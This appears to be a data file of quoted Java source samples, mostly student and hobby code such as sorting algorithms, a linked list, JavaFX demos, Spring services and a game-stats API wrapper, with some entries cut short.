    "public class Main {\n    public static void main(String[] args) {\n\n        ItemMenu hamburguer = new ItemMenu(\"Hamburguer\", \"Hamburguer artesanal com queijo cheddar, alface e tomate\", 15.0, true);\n        ItemMenu salada = new ItemMenu(\"Salada\", \"Salada de folhas verdes com tomate e molho\", 8.0, true);\n        ItemMenu sorvete = new ItemMenu(\"Sorvete\", \"Sorvete de chocolate com cobertura de caramelo salgado\", 12.0, false);\n\n        System.out.println(\"Nome do hamburguer: \" + hamburguer.getNome());\n        System.out.println(\"Descri\u00e7\u00e3o da salada: \" + salada.getDescricao());\n        System.out.println(\"Pre\u00e7o do sorvete: $\" + sorvete.getPreco());\n        System.out.println(\"Disponibilidade do hamburguer: \" + (hamburguer.isDisponivel() ? \"Dispon\u00edvel\" : \"Indispon\u00edvel\"));\n\n        System.out.println(\"O hamburguer est\u00e1 em promo\u00e7\u00e3o? \" + (hamburguer.estaEmPromocao() ? \"Sim\" : \"N\u00e3o\"));\n        System.out.println(\"A salada est\u00e1 em promo\u00e7\u00e3o? \" + (salada.estaEmPromocao() ? \"Sim\" : \"N\u00e3o\"));\n        System.out.println(\"O sorvete est\u00e1 em promo\u00e7\u00e3o? \" + (sorvete.estaEmPromocao() ? \"Sim\" : \"N\u00e3o\"));\n\n        sorvete.setPreco(10.0); //\n        hamburguer.setDisponivel(false);\n\n        System.out.println(\"Novo pre\u00e7o do sorvete: $\" + sorvete.getPreco());\n        System.out.println(\"Disponibilidade do hamburguer ap\u00f3s atualiza\u00e7\u00e3o: \" + (hamburguer.isDisponivel() ? \"Dispon\u00edvel\" : \"Indispon\u00edvel\"));\n    }\n}",
    "package asuHelloWorldJavaFX;\n\nimport javafx.application.Application;\nimport javafx.event.ActionEvent;\nimport javafx.event.EventHandler;\nimport javafx.scene.Scene;\nimport javafx.scene.control.Button;\nimport javafx.scene.layout.StackPane;\nimport javafx.stage.Stage;\n \npublic class ASUHelloWorldJavaFX extends Application {\n    public static void main(String[] args) {\n        launch(args);\n    }\n    \n    public void start(Stage primaryStage) {\n    \tSystem.out.println(\"ASU Hello World!\");\n    \tSystem.out.println(\"It started!\");\n        primaryStage.setTitle(\"ASU Hello World Spring 2024\");\n        Button btn = new Button();\n        btn.setText(\"Display: 'ASU says: Hello World!'\");\n        btn.setOnAction(new EventHandler<>() {\n            public void handle(ActionEvent event) {\n                System.out.println(\"ASU: Hello World!\");\n            }\n        });\n        \n        StackPane root = new StackPane();\n        root.getChildren().add(btn);\n        primaryStage.setScene(new Scene(root, 300, 250));\n        primaryStage.show();\n    }\n}",
    "import junit.framework.TestCase;\n\nimport java.util.Random;\n\nimport edu.uwm.cs351.CountingSort;\nimport edu.uwm.cs351.HybridSort;\nimport edu.uwm.cs351.QuickSort;\n\npublic class TestEfficiency extends TestCase {\n\n    private static final int ARRAY_SIZE = 10000;\n\n    public void testHybridSortEfficiency() {\n        int[] array = createRandomArray(ARRAY_SIZE);\n        int[] arr = HybridSort.calculateDynamicThreshold(array);\n        long startTime = System.currentTimeMillis();\n        HybridSort.sort(array, arr[0]);\n        long endTime = System.currentTimeMillis();\n    }\n    \n\n    public void testQuickSortEfficiency() {\n        int[] array = createRandomArray(ARRAY_SIZE);\n        int[] arr = HybridSort.calculateDynamicThreshold(array);\n        long startTime = System.currentTimeMillis();\n        QuickSort.sort(array, 0, array.length - 1,arr[1],arr[2],arr[0]);\n        long endTime = System.currentTimeMillis();\n    }\n\n    public void testCountingSortEfficiency() {\n        int[] array = createRandomArray(ARRAY_SIZE);\n        long startTime = System.currentTimeMillis();\n        CountingSort.sort(array);\n        long endTime = System.currentTimeMillis();\n    }\n\n    private int[] createRandomArray(int size) {\n        int[] array = new int[size];\n        Random random = new Random();\n        for (int i = 0; i < size; i++) {\n            array[i] = random.nextInt(size);\n        }\n        return array;\n    }\n}\n",
    "package edu.baylor.ecs.si;\r\n\r\nimport java.io.IOException;\r\nimport java.io.InputStream;\r\nimport java.util.logging.LogManager;\r\nimport java.util.logging.Logger;\r\n\r\npublic class Timer {\r\n\t\r\n\tprivate static Logger logger = Logger.getLogger(Timer.class.getName());\r\n\t\r\n\tstatic {\r\n\t\ttry {\r\n\t\t\tInputStream configFile = Timer.class.getClassLoader().getResourceAsStream(\"logger.properties\");\r\n\t\t\tLogManager.getLogManager().readConfiguration(configFile);\r\n\t\t\tconfigFile.close();\r\n\t\t} catch (IOException ex) {\r\n\t\t\tSystem.out.println(\"WARNING: Could not open configuration file\");\r\n\t\t    System.out.println(\"WARNING: Logging not configured (console output only)\");\r\n\t\t}\r\n\t\tlogger.info(\"starting the app\");\r\n\t}\r\n\t\r\n\t/*\r\n\t * Just sleep\r\n\t */\r\n\tprivate static void method(long time) throws InterruptedException {\r\n\t\tThread.sleep(time);\r\n\t}\r\n\t\r\n\tpublic static long timeMe(long timeToWait) throws TimerException {\r\n\t\tLong timeNow =0L;\r\n\t\ttry {\r\n\t\t  if (timeToWait < 0) {\r\n\t\t\t  throw new TimerException(\"Cannot be less than zero\");\r\n\t\t  }\r\n\t\t  timeNow = System.currentTimeMillis();\r\n\t\t  method(timeToWait);\r\n\r\n\t\t} catch (InterruptedException e) {\r\n\t\t\tlogger.severe(\"InterruptedException rised\");\r\n\t\t\tthrow new TimerException(\"Sleep exception\", e);\r\n\t\t} finally {\r\n\t\t\tlogger.info(\"Calling took: \"+ (System.currentTimeMillis() - timeNow));\r\n\t\t\tlogger.info(\"* should take: \"+ timeToWait);\r\n\t\t}\r\n\t\treturn timeNow;\r\n\t}\r\n}\r\n",
    "package ca.awoo.playerstorage;\n\nimport java.io.Serializable;\nimport java.util.Collection;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class PlayerData implements Serializable, Map<String, Object> {\n    private final HashMap<String, Object> data = new HashMap<>();\n    private boolean modified = false;\n    private long lastSave = 0;\n\n    public long getLastSave() {\n        return lastSave;\n    }\n\n    public void setLastSave(long lastSave) {\n        this.lastSave = lastSave;\n    }\n\n    public boolean isModified() {\n        return modified;\n    }\n\n    public void setModified(boolean modified) {\n        this.modified = modified;\n    }\n\n    @Override\n    public int size() {\n        return data.size();\n    }\n\n    @Override\n    public boolean isEmpty() {\n        return data.isEmpty();\n    }\n\n    @Override\n    public boolean containsKey(Object key) {\n        return data.containsKey(key);\n    }\n\n    @Override\n    public boolean containsValue(Object value) {\n        return data.containsValue(value);\n    }\n\n    @Override\n    public Object get(Object key) {\n        return data.get(key);\n    }\n\n    @Override\n    public Object put(String key, Object value) {\n        modified = true;\n        return data.put(key, value);\n    }\n\n    @Override\n    public Object remove(Object key) {\n        modified = true;\n        return data.remove(key);\n    }\n\n    @Override\n    public void putAll(Map<? extends String, ? extends Object> m) {\n        data.putAll(m);\n        modified = true;\n    }\n\n    @Override\n    public Set<String> keySet() {\n        return data.keySet();\n    }\n\n    @Override\n    public Collection<Object> values() {\n        return data.values();\n    }\n\n    @Override\n    public Set<Entry<String, Object>> entrySet() {\n        return data.entrySet();\n    }\n\n    @Override\n    public void clear() {\n        data.clear();\n        modified = true;\n    }\n}\n",
    "/* \r\n * Author:    Andrew Simon (n00695969)\r\n * Course:    COP3503 \r\n * Project #: 2 \r\n * Title  :  Input/Output\r\n * Due Date:  6/30/2022 \r\n * \r\n * Prompts the user for an input to a csv file/path, reads the data into ArrayLists,\r\n * formats the date from MM/DD/YYYY to YYYY/MM/DD, creates a new column for the \r\n * difference between the first two set of double values, next two sets of double values,\r\n * and the average of all four sets of double values, and prints all read/created values \r\n * into a new csv file.\r\n */ \r\n\r\nimport java.io.File;\r\nimport java.io.FileNotFoundException;\r\nimport java.io.PrintWriter;\r\nimport java.text.ParseException;\r\nimport java.text.SimpleDateFormat;\r\nimport java.util.ArrayList;\r\nimport java.util.Date;\r\nimport java.util.Scanner;\r\n\r\n/** Prompts the user for an input to a csv file/path, reads the data into ArrayLists,\r\n * formats the date from MM/DD/YYYY to YYYY/MM/DD, creates a new column for the \r\n * difference between the first two set of double values, next two sets of double values,\r\n * and the average of all four sets of double values, and prints all read/created values \r\n * into a new csv file.\r\n*/ \r\npublic class Project2 {\r\n\tpublic static ArrayList<String> dates = new ArrayList<String>();\r\n\tpublic static ArrayList<String> times = new ArrayList<String>();\r\n\tpublic static ArrayList<Double> sensor2278 = new ArrayList<Double>();\r\n\tpublic static ArrayList<Double> sensor3276 = new ArrayList<Double>();\r\n\tpublic static ArrayList<Double> sensor4689 = new ArrayList<Double>();\r\n\tpublic static ArrayList<Double> sensor5032 = new ArrayList<Double>();\r\n\tpublic static ArrayList<Double> section1Diff = new ArrayList<Double>();\r\n\tpublic static ArrayList<Double> section2Diff = new ArrayList<Double>();\r\n\tpublic static ArrayList<Double> totalAvg = new ArrayList<Double>();\r\n\tpublic static int counter = 0;\r\n\t\r\n\tpublic static void main(String[] args) {\r\n\t\t\r\n\t\tboolean flag = false;\r\n\t\tScanner console = new Scanner(System.in);\r\n\t\tSystem.out.println(\"Project 2 Data Preprocessing\\n\");\r\n\t\t\r\n\t\twhile(flag == false){\r\n\t\t\ttry{\r\n\t\t\t\t//Prompt user for input\r\n\t\t\t\tString fileName = getFile(console);\r\n\t\t\t\t\r\n\t\t\t\t//Read in and store data from file\r\n\t\t\t\treadFile(fileName);\r\n\t\t\t\t\r\n\t\t\t\t//print file data to new csv file\r\n\t\t\t\tprintFileData(fileName);\r\n\t\t\r\n\t\t\t\tSystem.out.println(\"Done! Exiting Program\");\r\n\t\t\t\tconsole.close();\r\n\t\t\t} \r\n\t\t\tcatch (FileNotFoundException e){\r\n\t\t\t\tSystem.out.println(\"*Invalid filename. Please try again*\");\r\n\t\t\t}\r\n\t\t\tcatch (NumberFormatException e){\r\n\t\t\t\tSystem.out.println(\"*Bad number data in CSV file. Please try again*\");\r\n\t\t\t\tresetArrayLists();\r\n\t\t\t}\r\n\t\t\tcatch (ParseException e){\r\n\t\t\t\tSystem.out.println(\"*Bad Date format in CSV file. Please try again*\");\r\n\t\t\t\tresetArrayLists();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t//Stops looping if loop count finishes all 299 lines of the Speed_Data.csv file data without an exception\r\n\t\t\t//Hard coded for this project but the solution would involve some condition along the lines of\r\n\t\t\t//\"if scanner.nextLine() == null\".\r\n\t\t\tif(dates.size() > 298)\r\n\t\t\t{\r\n\t\t\t\tflag = true;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t}//end flag loop\r\n\t}//end main\r\n\t\r\n\t/** \r\n\t * Formats a MM/DD/YYYY date to YYYY/MM/DD\r\n\t * @param Scanner console is input from user at keyboard\r\n\t * @return String fileName is the name of the file/path for user csv file \r\n\t */ \r\n\tpublic static String getFile(Scanner console)\r\n\t{\r\n\t\tSystem.out.println(\"Please enter file name & location: \");\r\n\t\tString fileName = console.next();\r\n\t\tSystem.out.printf(\"Reading in Data from the file: %s\\n\", fileName);\r\n\t\t\r\n\t\treturn fileName;\r\n\t}\r\n\r\n\t/** \r\n\t * Reads in data from input csv file and stores it into appropriate ArrayLists.\r\n\t * (Skips the first row of column names)\r\n\t * @param String fileName is name of file/path that the user input.\r\n\t */ \r\n\tpublic static void readFile(String fileName) throws FileNotFoundException\r\n\t{\r\n\t\tFile inputFile = new File(fileName);\r\n\t\tScanner lineRead = new Scanner(inputFile);\r\n\t\t\r\n\t\twhile(lineRead.hasNextLine())\r\n\t\t{\r\n\t\t\tString line = lineRead.nextLine();\r\n\t\t\tString[]lineSplit = line.split(\",\");\r\n\t\t\t\r\n\t\t\tif(counter > 0) {\r\n\t\t\t\t\r\n\t\t\tdates.add(lineSplit[0]);\r\n\t\t\ttimes.add(lineSplit[1]);\r\n\t\t\tsensor2278.add(Double.parseDouble(lineSplit[2]));\r\n\t\t\tsensor3276.add(Double.parseDouble(lineSplit[3]));\r\n\t\t\tsensor4689.add(Double.parseDouble(lineSplit[4]));\r\n\t\t\tsensor5032.add(Double.parseDouble(lineSplit[5]));\r\n\t\t\tsection1Diff.add(sensor2278.get(counter - 1) - sensor3276.get(counter - 1));\r\n\t\t\tsection2Diff.add(sensor4689.get(counter - 1) - sensor5032.get(counter - 1));\r\n\t\t\tdouble avg = (sensor2278.get(counter - 1) + sensor3276.get(counter - 1) + sensor4689.get(counter - 1) + sensor5032.get(counter - 1)) / (double)(4);\r\n\t\t\ttotalAvg.add(avg);\r\n\t\t\t}\r\n\t\t\tcounter++;\r\n\t\t}\r\n\t\tlineRead.close();\r\n\t}\r\n\r\n\t/** \r\n     * Formats a MM/DD/YYYY date to YYYY/MM/DD\r\n     * @param String date is original date.\r\n     * @return String date is the date newly formatted . \r\n     */ \r\n\tpublic static String dateFormat(String date) throws ParseException\r\n\t{\r\n\t\tSimpleDateFor",
    "public class Algorithms {\n    private SortingVisualizer visualizer;\n\n    public Algorithms(SortingVisualizer visualizer) {\n        this.visualizer = visualizer;\n    }\n\n    public void startAlgorithm(int[] data) {\n        switch (visualizer.selectedAlgorithm) {\n            case \"bubbleSort\":\n                bubbleSort(data);\n                break;\n            case \"insertionSort\":\n                insertionSort(data);\n                break;\n            case \"mergeSort\":\n                mergeSort(data, 0, data.length - 1);\n                break;\n            case \"heapSort\":\n                heapSort(data);\n                break;\n            case \"quickSort\":\n                quickSort(data, 0, data.length - 1);\n                break;\n            case \"shellSort\":\n                shellSort(data, data.length);\n                break;\n            case \"combSort\":\n                combSort(data);\n                break;\n            case \"exchangeSort\":\n                exchangeSort(data);\n                break;\n        }\n    }\n\n    private void bubbleSort(int[] data) {\n        for (int i = 0; i < data.length - 1; i++) {\n            for (int j = 0; j < data.length - 1; j++) {\n                if (data[j] > data[j + 1]) {\n                    int temp = data[j];\n                    data[j] = data[j + 1];\n                    data[j + 1] = temp;\n                    visualizer.drawData(visualizer.getGraphics(), data, new String[data.length]);\n                    try {\n                        Thread.sleep(200);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n\n    private void insertionSort(int[] data) {\n        for (int i = 1; i < data.length; i++) {\n            int key = data[i];\n            int j = i - 1;\n            while (j >= 0 && data[j] > key) {\n                data[j + 1] = data[j];\n                j = j - 1;\n                visualizer.drawData(visualizer.getGraphics(), data, new String[data.length]);\n                try {\n                    Thread.sleep(200);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n            data[j + 1] = key;\n        }\n    }\n\n    private void mergeSort(int[] data, int l, int r) {\n        if (l < r) {\n            int m = (l + r) / 2;\n            mergeSort(data, l, m);\n            mergeSort(data, m + 1, r);\n            merge(data, l, m, r);\n        }\n    }\n\n    private void merge(int[] data, int l, int m, int r) {\n        int n1 = m - l + 1;\n        int n2 = r - m;\n\n        int[] L = new int[n1];\n        int[] R = new int[n2];\n\n        for (int i = 0; i < n1; ++i)\n            L[i] = data[l + i];\n        for (int j = 0; j < n2; ++j)\n            R[j] = data[m + 1 + j];\n\n        int i = 0, j = 0;\n\n        int k = l;\n        while (i < n1 && j < n2) {\n            if (L[i] <= R[j]) {\n                data[k] = L[i];\n                i++;\n            } else {\n                data[k] = R[j];\n                j++;\n            }\n            k++;\n        }\n\n        while (i < n1) {\n            data[k] = L[i];\n            i++;\n            k++;\n        }\n\n        while (j < n2) {\n            data[k] = R[j];\n            j++;\n            k++;\n        }\n\n        visualizer.drawData(visualizer.getGraphics(), data, new String[data.length]);\n        try {\n            Thread.sleep(200);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void heapSort(int[] data) {\n        int n = data.length;\n\n        for (int i = n / 2 - 1; i >= 0; i--)\n            heapify(data, n, i);\n\n        for (int i = n - 1; i > 0; i--) {\n            int temp = data[0];\n            data[0] = data[i];\n            data[i] = temp;\n\n            heapify(data, i, 0);\n        }\n    }\n\n    private void heapify(int[] data, int n, int i) {\n        int largest = i;\n        int l = 2 * i + 1;\n        int r = 2 * i + 2;\n\n        if (l < n && data[l] > data[largest])\n            largest = l;\n\n        if (r < n && data[r] > data[largest])\n            largest = r;\n\n        if (largest != i) {\n            int swap = data[i];\n            data[i] = data[largest];\n            data[largest] = swap;\n\n            heapify(data, n, largest);\n        }\n        visualizer.drawData(visualizer.getGraphics(), data, new String[data.length]);\n        try {\n            Thread.sleep(200);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void quickSort(int[] data, int low, int high) {\n        if (low < high) {\n            int pi = partition(data, low, high);\n\n            quickSort(data, low, pi - 1);\n            quickSort(data, pi + 1, high);\n        }\n    }\n\n    private int partition(int[] data, int low, int high) {\n        int pivot = data[high];\n        int i = (low - 1);\n        for (int j = low; j < high; j++) {\n            if (data[j] < pivot) {\n                i++;\n",
    "package asuHelloWorldJavaFX;\n\nimport javafx.application.Application;\nimport javafx.event.ActionEvent;\nimport javafx.event.EventHandler;\nimport javafx.scene.Scene;\nimport javafx.scene.control.Button;\nimport javafx.scene.layout.StackPane;\nimport javafx.stage.Stage;\n \npublic class ASUHelloWorldJavaFX extends Application {\n    public static void main(String[] args) {\n        launch(args);\n    }\n    \n    public void start(Stage primaryStage) {\n    \t//this is to test javafx\n    \tSystem.out.println(\"ASU Hello World!\");\n    \tSystem.out.println(\"It started!\");\n        primaryStage.setTitle(\"In class GitHub Activity\");\n        Button btn = new Button();\n        btn.setText(\"Modest's second commit\");\n        btn.setOnAction(new EventHandler<>() {\n            public void handle(ActionEvent event) {\n                System.out.println(\"ASU: Hello World!\");\n            }\n        });\n        \n        StackPane root = new StackPane();\n        root.getChildren().add(btn);\n        primaryStage.setScene(new Scene(root, 300, 250));\n        primaryStage.show();\n    }\n}",
    "package com.financiero.cuentasmovimientosmicroservicio.service.impl;\n\nimport com.financiero.cuentasmovimientosmicroservicio.domain.Cuenta;\nimport com.financiero.cuentasmovimientosmicroservicio.domain.Movimiento;\nimport com.financiero.cuentasmovimientosmicroservicio.repository.CuentaRepository;\nimport com.financiero.cuentasmovimientosmicroservicio.repository.MovimientoRepository;\nimport com.financiero.cuentasmovimientosmicroservicio.service.SaldoInsuficienteException;\nimport com.financiero.cuentasmovimientosmicroservicio.service.spec.IMovimientoService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\n\nimport java.time.LocalDate;\nimport java.util.List;\nimport java.util.Optional;\nimport java.util.stream.Collectors;\n\n@Service\npublic class MovimientoServiceImpl implements IMovimientoService {\n\n    @Autowired\n    private MovimientoRepository movimientoRepository;\n\n    @Autowired\n    private CuentaRepository cuentaRepository;\n\n    @Override\n    public List<Movimiento> getAllMovimientos() {\n        return movimientoRepository.findAll();\n    }\n\n    @Override\n    public Optional<Movimiento> getMovimientoById(Long id) {\n        return movimientoRepository.findById(id);\n    }\n\n    @Override\n    public Movimiento createMovimiento(Movimiento movimiento) {\n        Cuenta cuenta = movimiento.getCuenta();\n        Cuenta cuentaExistente = cuentaRepository.findById(cuenta.getId())\n                .orElseThrow(() -> new RuntimeException(\"La cuenta no existe\"));\n\n        double saldoFinal = cuentaExistente.getSaldoFinal();\n        double valorMovimiento = Math.abs(movimiento.getValor());\n        double saldoActual = movimiento.getTipoMovimiento().equals(\"Retiro\") ?\n                saldoFinal - valorMovimiento :\n                saldoFinal + valorMovimiento;\n\n        if (saldoActual < 0) {\n            throw new SaldoInsuficienteException(\"Saldo no disponible\");\n        }\n\n        cuentaExistente.setSaldoFinal(saldoActual);\n        Cuenta cuentaActualizada = cuentaRepository.save(cuentaExistente);\n\n        movimiento.setCuenta(cuentaActualizada);\n        movimiento.setSaldo(saldoActual);\n\n        return movimientoRepository.save(movimiento);\n    }\n\n    @Override\n    public void deleteMovimiento(Long id) {\n        movimientoRepository.deleteById(id);\n    }\n\n    @Override\n    public List<Movimiento> obtenerReporteMovimientos(LocalDate fechaInicio,\n                                                      LocalDate fechaFin,\n                                                      String numeroCuenta) {\n        List<Movimiento> movimientos = movimientoRepository.findAll();\n        return movimientos.stream()\n                .filter(movimiento ->\n                        movimiento.getCuenta().getNumeroCuenta().equals(numeroCuenta) &&\n                                (movimiento.getFecha().isEqual(fechaInicio)\n                                        || movimiento.getFecha().isAfter(fechaInicio)) &&\n                                (movimiento.getFecha().isEqual(fechaFin)\n                                        || movimiento.getFecha().isBefore(fechaFin)))\n                .collect(Collectors.toList());\n    }\n}",
    "package com.coffeewithdeveloper.coffeewithdeveloper.Entities;\n\nimport jakarta.persistence.*;\n\nimport java.time.LocalDate;\nimport java.util.Collection;\n\n@Entity\n@Table(name = \"users\")\npublic class User {\n\n    public User() {\n    }\n\n    public User(Long id, String firstname, String lastname, String email, String password, String phone, LocalDate dateOfBirth) {\n        this.id = id;\n        this.firstname = firstname;\n        this.lastname = lastname;\n        this.email = email;\n        this.password = password;\n        this.phone = phone;\n        DateOfBirth = dateOfBirth;\n    }\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n\n    private String firstname;\n    private String lastname;\n    @Column(unique = true, nullable = false)\n    private String email;\n    private String password;\n    private String phone;\n    private LocalDate DateOfBirth;\n\n\n    public void setId(Long id) {\n        this.id = id;\n    }\n\n    public Long getId() {\n        return id;\n    }\n\n    public String getFirstname() {\n        return firstname;\n    }\n\n    public void setFirstname(String firstname) {\n        this.firstname = firstname;\n    }\n\n    public String getLastname() {\n        return lastname;\n    }\n\n    public void setLastname(String lastname) {\n        this.lastname = lastname;\n    }\n\n    public String getEmail() {\n        return email;\n    }\n\n    public void setEmail(String email) {\n        this.email = email;\n    }\n\n    public String getPassword() {\n        return password;\n    }\n\n    public void setPassword(String password) {\n        this.password = password;\n    }\n\n    public String getPhone() {\n        return phone;\n    }\n\n    public void setPhone(String phone) {\n        this.phone = phone;\n    }\n\n    public LocalDate getDateOfBirth() {\n        return DateOfBirth;\n    }\n\n    public void setDateOfBirth(LocalDate dateOfBirth) {\n        DateOfBirth = dateOfBirth;\n    }\n\n    @Override\n    public String toString() {\n        return \"User{\" +\n                \"id=\" + id +\n                \", firstname='\" + firstname + '\\'' +\n                \", lastname='\" + lastname + '\\'' +\n                \", email='\" + email + '\\'' +\n                \", password='\" + password + '\\'' +\n                \", phone='\" + phone + '\\'' +\n                \", DateOfBirth=\" + DateOfBirth +\n                '}';\n    }\n\n    @ManyToMany\n    private Collection<Role> Roles;\n\n    public Collection<Role> getRoles() {\n        return Roles;\n    }\n\n    public void setRoles(Role roles) {\n        Roles.add(roles);\n    }\n}\n",
    "\npublic class SingleLinkedList<E> {\n\npublic static class Node<E> {\n    //-------------------------------- Node Class --------------------------------------- \n\n        private E element; // reference to the element stored at this node\n        private Node<E> next; // reference to the subsequent node in the list\n\n        public Node(E e, Node<E> n) {\n            element = e;\n            next = n;\n        }\n        public Node() {\n                   element = null;\n                   next = null;\n               }\n\n        public E getElement() {\n            return element;\n        }\n\n        public Node<E> getNext() {\n            return next;\n        }\n\n        public void setNext(Node<E> n) {\n            next = n;\n        }\n\n        public void setelement(E element) {\n            this.element = element;\n        }\n    }\n   \n\n    Node<E> head; // head node of the list (or null if empty)\n    Node<E> tail; // last node of the list (or null if empty)\n    private int size; // number of nodes in the list\n\n    public SingleLinkedList() {// constructs an initially empty list\n        head = null;\n        tail = null;\n        size = 0;\n    }\n\n    // access methods\n    public int size() {\n        return size;\n    }\n\n    public boolean isEmpty() {\n        return size == 0;\n    }\n\n    public E first() { // returns (but does not remove) the first element\n        if (isEmpty()) {\n            return null;\n        }\n        return head.getElement();\n    }\n\n    public E last() { // returns (but does not remove) the last element\n        if (isEmpty()) {\n            return null;\n        }\n        return tail.getElement();\n    }\n\n    // update methods\n    public void addFirst(E e) { // adds element e to the front of the list\n        Node<E> newest = new Node<E>(e, null); // create and link a new node\n        newest.setNext(head);\n        head = newest;\n        if (size == 0) {\n            tail = head; // special case: new node becomes tail also\n        }\n        size++;\n    }\n\n    public void addLast(E e) { // adds element e to the end of the list\n        Node<E> newest = new Node<E>(e, null); // node will eventually be the tail\n        if (isEmpty()) {\n            head = newest; // special case: previously empty list\n        } else {\n            tail.setNext(newest); // new node after existing tail\n        }\n        tail = newest; // new node becomes the tail\n        size++;\n    }\n\n    public E removeFirst() { // removes and returns the first element\n        if (isEmpty()) {\n            return null; // nothing to remove\n        }\n        E answer = head.getElement();\n        head = head.getNext(); // will become null if list had only one node\n        size--;\n        if (size == 0) {\n            tail = null; // special case as list is now empty\n        }\n        return answer;\n    }\n\n    public E removeLast() {  // removes and returns the last node\n\n        if (size == 0) {\n            return null;\n        }// nothing to remove\n        else {\n            E data = tail.getElement();  // get a copy of the data stored in the last node\n            if (size == 1) // only one node in the list\n            {\n                head = tail = null;\n            } else { // at least two nodes\n                Node temp1 = head;// make temp1 point to the head \n                Node temp2 = null; // make temp2 point to null\n                while (temp1.getNext() != null) // find last node\n                {\n                    temp2 = temp1;\n                    temp1 = temp1.getNext();\n                }\n                temp2.setNext(null); // null out the next pointer of the last node \n                tail = temp2; // update the value of tail\n            }\n            size--; //decrement the size of list\n            return data; // return the value stored in the removed node\n        }\n    }\n\n    public void Display() {\n        Node temp = head;\n        System.out.print(\" head->\");\n        while (temp != null) {\n            System.out.print(temp.getElement() + \"->\");\n            temp = temp.getNext();\n        }\n        System.out.print(\"tail\");\n    }\n\n    public void printList() {\n        Node<E> current = head;\n        if (current.getElement() != null) {\n            System.out.println(current.getElement());\n            current = current.getNext();\n        }\n    }\n    \n    public void addAtPosition(E e, int position){\n        if(position < 1 || position > size){\n            System.out.println(\"Invalid Position!\");\n            return;\n        }\n        Node<E> newest = new Node<>(e,null);\n        if(position ==1 ){\n            newest.setNext(head);\n            head =  newest;\n            if(size == 0){\n                tail = head;\n            }\n        }\n        Node<E> current = head;\n        for (int i = 0; i < position; i++) {\n            current = current.getNext();           \n        }\n        newest.setNext(current.getNext());\n        current.setNext(newest);\n        size++;\n    }\n\n}\n// End SinglyLinkedList Class\n\n",
    "import com.google.gson.JsonParser;\nimport com.google.gson.JsonSyntaxException;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Scanner;\n\nclass HopliteAPI {\n    private static final String BASE_URL = \"https://hopliteapi.isabel.gg/api/stats\";\n    private static final int TIMEOUT_SECONDS = 10;\n\n    public String getRoyaleStats(String username) throws IOException {\n        /*\n         * Returns Battle Royale stats for the player\n         */\n        return makeRequest(BASE_URL + \"/royale/\" + username);\n    }\n\n    public String getDuelsStats(String username) throws IOException {\n        /*\n         * Returns Duels stats for the player\n         */\n        return makeRequest(BASE_URL + \"/duels/\" + username);\n    }\n\n    private String makeRequest(String urlString) throws IOException {\n        URL url = new URL(urlString);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setReadTimeout(TIMEOUT_SECONDS * 1000);\n        connection.setConnectTimeout(TIMEOUT_SECONDS * 1000);\n\n        try {\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                try (InputStream inputStream = connection.getInputStream();\n                     InputStreamReader inputStreamReader = new InputStreamReader(inputStream, StandardCharsets.UTF_8)) {\n                    StringBuilder response = new StringBuilder();\n                    Scanner scanner = new Scanner(inputStreamReader);\n                    while (scanner.hasNextLine()) {\n                        response.append(scanner.nextLine());\n                    }\n                    return JsonParser.parseString(response.toString()).toString();\n                } catch (JsonSyntaxException e) {\n                    throw new IOException(\"Failed to parse JSON response\", e);\n                }\n            } else {\n                throw new IOException(\"HTTP error code: \" + responseCode);\n            }\n        } finally {\n            connection.disconnect();\n        }\n    }\n}\n\npublic class wrapper {\n    public static void main(String[] args) {\n        HopliteAPI api = new HopliteAPI();\n        String username = \"flowtives\";\n\n        try {\n            String royaleStats = api.getRoyaleStats(username);\n            System.out.println(royaleStats);\n\n            String duelsStats = api.getDuelsStats(username);\n            System.out.println(duelsStats);\n        } catch (IOException e) {\n            System.err.println(\"Error fetching stats: \" + e.getMessage());\n            e.printStackTrace();\n        }\n    }\n}",
    "package com.divide.by.zero.security.config;\n\nimport com.divide.by.zero.security.auditing.ApplicationAuditAware;\nimport com.divide.by.zero.security.repository.UserRepository;\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.domain.AuditorAware;\nimport org.springframework.security.authentication.AuthenticationManager;\nimport org.springframework.security.authentication.AuthenticationProvider;\nimport org.springframework.security.authentication.dao.DaoAuthenticationProvider;\nimport org.springframework.security.config.annotation.authentication.configuration.AuthenticationConfiguration;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.core.userdetails.UsernameNotFoundException;\nimport org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;\nimport org.springframework.security.crypto.password.PasswordEncoder;\n\n@Configuration\n@RequiredArgsConstructor\npublic class ApplicationConfig {\n\n    private final UserRepository repository;\n\n    @Bean\n    public UserDetailsService userDetailsService() {\n        return username -> repository.findByEmail(username)\n                .orElseThrow(() -> new UsernameNotFoundException(\"User not found\"));\n    }\n\n    @Bean\n    public AuthenticationProvider authenticationProvider() {\n        DaoAuthenticationProvider authProvider = new DaoAuthenticationProvider();\n        authProvider.setUserDetailsService(userDetailsService());\n        authProvider.setPasswordEncoder(passwordEncoder());\n        return authProvider;\n    }\n\n    @Bean\n    public AuditorAware<Integer> auditorAware() {\n        return new ApplicationAuditAware();\n    }\n\n    @Bean\n    public AuthenticationManager authenticationManager(AuthenticationConfiguration config) throws Exception {\n        return config.getAuthenticationManager();\n    }\n\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder();\n    }\n\n}\n",
